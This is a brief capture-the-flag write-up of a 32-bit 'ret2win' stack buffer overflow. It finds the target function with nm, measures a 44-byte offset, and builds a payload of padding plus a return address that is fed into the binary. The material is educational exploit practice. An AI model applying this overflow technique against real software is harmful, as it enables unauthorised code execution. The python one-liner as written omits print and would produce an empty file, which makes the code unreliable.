
# Ret2win

Firts we need to find the direction to jump, the `nm ret2win32 | grep '  t  '` line will show us the functions created inside ret2win32. From that we extract the direction for the function "ret2win" becouse looks like the thing we are looking for.  

One way to know when overflow is to execute the file with lots of characters and see witch number of characters make crash the execution, in this case with the x86 version 44 characters are needed.

So with that we can create a one liner to create a file with the direction to jump

```console
python2 -c '"A"*44 + "\x2c\x86\x04\x08"' > input
```

Now in this binary *input* is the enough lenght to overflow the stack and modify the next call to the direction extracted before

Now introducing the input

```console
./ret2win32 < input
```
